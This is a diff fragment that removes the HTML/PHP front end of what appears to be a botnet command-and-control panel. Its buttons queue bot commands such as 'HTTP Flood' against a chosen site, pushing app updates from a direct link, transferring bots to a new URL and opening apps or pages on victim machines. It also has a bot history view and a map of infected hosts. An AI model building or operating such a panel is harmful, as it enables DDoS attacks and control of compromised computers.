-			  <td><input class="form-control input-small" id="webpagesite" type="text" placeholder="Site"></td>
-			  <td><button type="button" onclick="addCommand('openwebpage', document.getElementById('webpagesite').value)" class="btn btn-default btn-small fullwidth">Open Page</button></td>
-			</tr>
-		    <tr>
-			  <td><input class="form-control input-small" id="dialogtitle" type="text" placeholder="Title"><input class="form-control input-small" id="dialogmessage" type="text" placeholder="Message"></td>
-			  <td><button type="button" onclick="addCommand('opendialog', document.getElementById('dialogtitle').value, document.getElementById('dialogmessage').value)" class="btn btn-default btn-small fullwidth">Open Dialog</button></td>
-			</tr>
-		    <tr>
-			  <td><input class="form-control input-small" id="appname" type="text" placeholder="App"></td>
-			  <td><button type="button" onclick="addCommand('openapp', document.getElementById('appname').value)" class="btn btn-default btn-small fullwidth">Open App</button></td>
-			</tr>
-		    <tr>
-			  <td><input class="form-control input-small" id="floodsite" type="text" placeholder="Site"><input class="form-control input-small" id="floodtime" type="text" placeholder="Time in MS"></td>
-			  <td><button type="button" onclick="addCommand('httpflood', document.getElementById('floodsite').value, document.getElementById('floodtime').value)" class="btn btn-default btn-small fullwidth">HTTP Flood</button></td>
-			</tr>
-		    <tr>
-			  <td><input class="form-control input-small" id="updateapplink" type="text" placeholder="Direct Link"><input class="form-control input-small" id="updateappversion" type="text" placeholder="Version #"></td>
-			  <td><button type="button" onclick="addCommand('updateapp', document.getElementById('updateapplink').value, document.getElementById('updateappversion').value)" class="btn btn-default btn-small fullwidth">Update App</button></td>
-			</tr>
-		    <tr>
-			  <td><input class="form-control input-small" id="promptupdateversion" type="text" placeholder="Version #"></td>
-			  <td><button type="button" onclick="addCommand('promptupdate', document.getElementById('promptupdateversion').value)" class="btn btn-default btn-small fullwidth">Prompt Update</button></td>
-			</tr>
-		    <tr>
-			  <td><input class="form-control input-small" id="transferboturl" type="text" placeholder="URL"></td>
-			  <td><button type="button" onclick="addCommand('transferbot', document.getElementById('transferboturl').value)" class="btn btn-default btn-small fullwidth">Transfer Bot</button></td>
-			</tr>
-		    <tr>
-			  <td><input class="form-control input-small" id="timeouttime" type="text" placeholder="Time in MS"></td>
-			  <td><button type="button" onclick="addCommand('settimeout', document.getElementById('timeouttime').value)" class="btn btn-default btn-small fullwidth">Set Timeout</button></td>
-			</tr>
-		    <tr>
-			  <td colspan="2"><button type="button" onclick="addCommand('promptuninstall')" class="btn btn-default btn-small fullwidth">Prompt Uninstall</button></td>
-			</tr>
-            <tr><td></td><td></td><td></td></tr>
-		  </table>
-		</div>
-	  </div>
-	  <div class="row" style="height:37%; ">
-		    <div class="col-lg-5 messageboxcontainer" style="height:100%; min-height: 100%;">
-			  <h4 style="display: inline-block;">History Of: <a id="historyof">All Bots</a></h4>&nbsp;&nbsp;<button type="button" class="btn btn-default btn-small" onclick="stoprefresh(); getHistory(''); autorefresh('');">All Bots</button>&nbsp;&nbsp;<button type="button" class="btn btn-default btn-small" id="autoscrollbutton" onclick="updateScroll();">Auto Scroll: <?php if($autoscrolltextbox){echo "On";} else {echo "Off";} ?></button>&nbsp;&nbsp;<button type="button" class="btn btn-default btn-small" onclick="viewCommands();">View Awaiting Commands</button>
-			  <div class="well well-small" id="messagebox" style="max-height: 75%; min-height: 75%; overflow: auto;">
-			    <div id="messages" style="font-size: <?php echo $postboxtextsize . 'px;'; ?>"></div>
-			  </div>
-			</div>
-			<div class="col-lg-4 filestable" style="height:100%; min-height: 100%; overflow: auto;">
-			  <div id="filetablefill"></div>
-			</div>
-	    <div class="col-lg-3 mapcontainer" style="height:100%; min-height: 100%;">
-		  <div class="map" id="map-canvas"></div>
-		  <button type="button" onClick="window.location='settings.php'" style="width: 48%" class="btn btn-default btn-small">Panel Settings</button>&nbsp;&nbsp;&nbsp;<button type="button" onClick="window.location='logout.php'" style="width: 48%" class="btn btn-default btn-small">Logout</button>
-		</div>
-	  </div>
-	</div>
-	
-	<script src="assets/js/bootstrap.min.js"></script>
-	<script>
-	$(document).ready(function() 
-        { 
-			$("#files").tablesorter();
-        } 
-    );
-    </script>
-
   </body>
 </html>
 <?php
